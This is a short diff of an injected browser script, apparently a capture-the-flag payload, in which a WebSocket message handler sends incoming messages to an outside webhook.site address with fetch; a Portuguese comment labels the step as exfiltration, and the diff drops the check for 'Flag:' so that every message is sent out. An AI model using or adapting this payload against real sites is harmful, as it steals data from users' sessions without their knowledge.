@@ -11,11 +11,9 @@
   };
   ws.onmessage = async (e) => {
     const data = JSON.parse(e.data);
-    if (data.message && data.message.startsWith('Flag:')) {
       // 3) Exfiltra para seu webhook
       await fetch('https://60ceeedd-4d07-4620-94b4-d916596ae4d6.webhook.site/?flag=' +
                   encodeURIComponent(data.message));
-    }
   };
 })();
 </script>
